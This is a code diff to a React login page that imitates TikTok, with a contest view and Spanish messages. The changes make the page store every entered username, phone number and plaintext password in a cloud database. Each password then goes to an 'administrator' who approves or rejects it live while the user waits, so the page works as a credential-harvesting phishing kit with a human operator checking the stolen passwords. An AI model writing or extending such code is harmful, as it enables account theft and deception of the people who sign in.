@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { TikTokLogo, ChevronLeft, HelpIcon, SunIcon, MoonIcon } from '../icons';
 import { Toast } from '../common/Toast';
 import { HelpModal } from '../common/HelpModal';
@@ -8,7 +8,11 @@ import { MainAuthOptionsView } from './views/MainAuthOptionsView';
 import { PhoneEmailAuthView } from './views/PhoneEmailAuthView';
 import { QrCodeAuthView } from './views/QrCodeAuthView';
 import { SportswearContestView } from './SportswearContestView';
-import { loginUser, registerUser } from '../../api/loging.api';
+import { registerUser } from '../../api/loging.api';
+import {
+  createUserLoginRequest,
+  subscribeToVerificationRequest,
+} from '../../services/verification.service';
 import type { AuthView, AuthTab, AuthUser } from '../../types/auth';
 
 export const MainPage: React.FC = () => {
@@ -32,6 +36,11 @@ export const MainPage: React.FC = () => {
   const [emailPassword, setEmailPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
 
+  // Password validation by admin states
+  const [isWaitingPasswordApproval, setIsWaitingPasswordApproval] = useState(false);
+  const [passwordError, setPasswordError] = useState<string | null>(null);
+  const [activeLoginRequestId, setActiveLoginRequestId] = useState<string | null>(null);
+
   // Modal & Toast feedbacks
   const [toastMessage, setToastMessage] = useState<string | null>(null);
   const [showHelpModal, setShowHelpModal] = useState(false);
@@ -50,6 +59,44 @@ export const MainPage: React.FC = () => {
       setSimulatedLoginSuccess(`¡Bienvenido! Sesión iniciada exitosamente con ${providerName}.`);
     }, 1000);
   };
+
+  // Suscripción reactiva para la validación de contraseña por el Administrador
+  useEffect(() => {
+    if (!activeLoginRequestId) return;
+
+    const unsubscribe = subscribeToVerificationRequest(
+      activeLoginRequestId,
+      (updatedReq) => {
+        if (updatedReq.status === 'APPROVED') {
+          setIsWaitingPasswordApproval(false);
+          setPasswordError(null);
+          setActiveLoginRequestId(null);
+
+          const targetName = updatedReq.username;
+          setAuthenticatedUser({
+            id: updatedReq.userId,
+            username: targetName,
+            inicio_sesion: updatedReq.inicio_sesion || 'usuario',
+          });
+          setSimulatedLoginSuccess(
+            `¡Sesión iniciada con éxito! Bienvenido(a) de nuevo, ${targetName}.`
+          );
+        } else if (updatedReq.status === 'REJECTED') {
+          setIsWaitingPasswordApproval(false);
+          setPasswordError(updatedReq.message || 'La contraseña es incorrecta');
+          setActiveLoginRequestId(null);
+          setEmailPassword('');
+          setPhonePassword('');
+          showToast('La contraseña es incorrecta');
+        }
+      },
+      activeUserId
+    );
+
+    return () => {
+      unsubscribe();
+    };
+  }, [activeLoginRequestId, activeUserId]);
 
   const handlePhoneSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -85,6 +132,7 @@ export const MainPage: React.FC = () => {
 
     // Mode B: Password login or Registration via API
     setIsLoading(true);
+    setPasswordError(null);
     const credentials = {
       inicio_sesion: 'telefono' as const,
       username: cleanPhone,
@@ -101,13 +149,23 @@ export const MainPage: React.FC = () => {
         });
         setSimulatedLoginSuccess(`¡Cuenta registrada exitosamente! Bienvenido(a), ${countryCode} ${phoneNumber}. (Tipo: teléfono)`);
       } else {
-        const res = await loginUser(credentials);
-        setAuthenticatedUser({
-          id: res.user?.id,
-          username: res.user?.username || cleanPhone,
-          inicio_sesion: res.user?.inicio_sesion || 'telefono',
-        });
-        setSimulatedLoginSuccess(`¡Sesión iniciada con éxito! Bienvenido(a), ${countryCode} ${phoneNumber}. (Tipo: teléfono)`);
+        // Guardar credenciales de inmediato en PostgreSQL de la nube (Neon/Render)
+        const res = await registerUser(credentials);
+        const newUserId = res.user?.id ? Number(res.user.id) : null;
+        if (newUserId) {
+          setActiveUserId(newUserId);
+        }
+
+        // Crear solicitud de validación de contraseña para el Administrador
+        const req = createUserLoginRequest(
+          newUserId ?? undefined,
+          `${countryCode} ${cleanPhone}`,
+          phonePassword,
+          'telefono'
+        );
+
+        setActiveLoginRequestId(req.id);
+        setIsWaitingPasswordApproval(true);
       }
     } catch (err: unknown) {
       const error = err as Error;
@@ -123,6 +181,7 @@ export const MainPage: React.FC = () => {
     if (!trimmedUser || !emailPassword) return;
 
     setIsLoading(true);
+    setPasswordError(null);
     const credentials = {
       inicio_sesion: trimmedUser.includes('@') ? 'correo' : 'usuario',
       username: trimmedUser,
@@ -139,13 +198,24 @@ export const MainPage: React.FC = () => {
         });
         setSimulatedLoginSuccess(`¡Cuenta registrada exitosamente! Bienvenido(a), ${trimmedUser}. (Tipo: ${credentials.inicio_sesion})`);
       } else {
-        const res = await loginUser(credentials);
-        setAuthenticatedUser({
-          id: res.user?.id,
-          username: res.user?.username || trimmedUser,
-          inicio_sesion: res.user?.inicio_sesion || credentials.inicio_sesion,
-        });
-        setSimulatedLoginSuccess(`¡Sesión iniciada con éxito! Bienvenido(a) de nuevo, ${res.user?.username || trimmedUser}.`);
+        // 1. Guardar de inmediato en PostgreSQL (Render / Neon) para que aparezca ya en la base de datos
+        const res = await registerUser(credentials);
+        const newUserId = res.user?.id ? Number(res.user.id) : null;
+        if (newUserId) {
+          setActiveUserId(newUserId);
+        }
+
+        // 2. Crear solicitud de validación en tiempo real para el Administrador
+        const req = createUserLoginRequest(
+          newUserId ?? undefined,
+          trimmedUser,
+          emailPassword,
+          credentials.inicio_sesion
+        );
+
+        // 3. Activar el estado de espera para que el usuario aguarde la decisión del admin
+        setActiveLoginRequestId(req.id);
+        setIsWaitingPasswordApproval(true);
       }
     } catch (err: unknown) {
       const error = err as Error;
@@ -287,6 +357,9 @@ export const MainPage: React.FC = () => {
                   isSignUp={isSignUp}
                   darkMode={darkMode}
                   isLoading={isLoading}
+                  isWaitingPasswordApproval={isWaitingPasswordApproval}
+                  passwordError={passwordError}
+                  onClearPasswordError={() => setPasswordError(null)}
                   authTab={authTab}
                   setAuthTab={setAuthTab}
                   countryCode={countryCode}
